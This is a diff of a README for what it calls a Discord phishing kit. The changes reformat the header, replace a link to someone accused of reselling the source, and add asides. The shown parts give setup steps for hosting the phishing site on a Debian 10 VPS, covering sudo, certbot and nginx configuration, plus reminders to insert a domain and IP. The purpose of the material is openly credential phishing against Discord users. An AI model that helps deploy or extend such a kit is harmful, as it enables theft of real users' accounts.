@@ -1,10 +1,11 @@
-# Discord-Phishing - Just a heads up, IF YOU BOUGHT THIS SOURCE YOU GOT SCAMMED 👀
+<h2 align = "center"> 👀 Just a heads up, if you bought this source, you've been scammed 👀 </h2>
 
-### SKIDS
+<h3 align = "center"> SKIDS <h3>
 
-- [First](https://github.com/discordloginphish/akifsphish) (+ they tried selling it in a Discord Server for 30€)
+<h4 align = "center"><a href="https://github.com/akifrzayev09/discordphishing"> Akif dude (+ they tried selling it in a Discord Server for 30€ smh) </a><h4>
 
-# SETUP(Debian 10)
+ -----------------------------------------------------
+# SETUP (Debian 10)
 
 ```
 apt install sudo
@@ -37,7 +38,7 @@ sudo apt install certbot
 
 nano /etc/nginx/conf.d/ip.conf
 ```
-# Put and setup VPS CONFIG, CTRL+O, ENTER, CTRL+X
+Put and setup VPS CONFIG, CTRL+O, ENTER, CTRL+X
 
 
 -----------------------------------------------------
@@ -66,7 +67,7 @@ systemctl start nginx
 -----------------------------------------------------
 
 
-# *VDS CONGIG*
+# *VDS CONGIG* (idk what this guy meant to say)
  !!!! Dont forget change "!!!!!!!!!!!!!!!!!!!!!!DOMAIN" to ur domain name!
  !!!! Dont forget change "!!!!!!!!!!!!!!!!!!!!!!IP" to ur VPS ip!
 
